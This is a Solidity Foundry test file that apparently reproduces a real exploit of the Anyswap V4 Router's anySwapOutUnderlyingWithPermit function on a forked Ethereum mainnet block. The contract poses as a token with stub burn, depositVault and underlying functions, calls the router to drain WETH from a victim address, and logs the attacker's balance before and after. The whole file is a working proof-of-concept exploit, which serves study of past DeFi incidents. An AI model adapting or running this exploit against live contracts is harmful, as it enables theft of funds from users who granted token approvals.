// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "ds-test/test.sol";
import "./interface.sol";

contract ContractTest is DSTest {
    address WETH_Address = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    AnyswapV4Router any  = AnyswapV4Router(0x6b7a87899490EcE95443e979cA9485CBE7E71522);
    AnyswapV1ERC20 any20 =AnyswapV1ERC20(0x6b7a87899490EcE95443e979cA9485CBE7E71522);
    WETH  weth = WETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    uint256 mainnetFork;

    function setUp() public {
        mainnetFork = cheats.createFork("https://rpc.ankr.com/eth", 14037236); // fork mainnet block number 14037236
        cheats.selectFork(mainnetFork);
    }

    function testExample() public {
       //https://etherscan.io/tx/0xe50ed602bd916fc304d53c4fed236698b71691a95774ff0aeeb74b699c6227f7
      any.anySwapOutUnderlyingWithPermit(0x3Ee505bA316879d246a8fD2b3d7eE63b51B44FAB,address(this),msg.sender,308636644758370382903,100000000000000000000,0,"0x","0x",56);
      emit log_named_uint("Before exploit, WETH balance of attacker:", weth.balanceOf(msg.sender));
      weth.transfer(msg.sender, 308636644758370382901);
      //uint sender = weth.balanceOf(msg.sender);
      emit log_named_uint("After exploit, WETH balance of attacker:", weth.balanceOf(msg.sender));
}

    function burn(address from, uint256 amount) external returns (bool){
        amount;
        from;
        return true;
    }

    function depositVault(uint amount, address to) external returns (uint){
        amount;
        to;
        return 1;
    }

     function underlying() external view returns (address){
        return WETH_Address;
        
    }
}
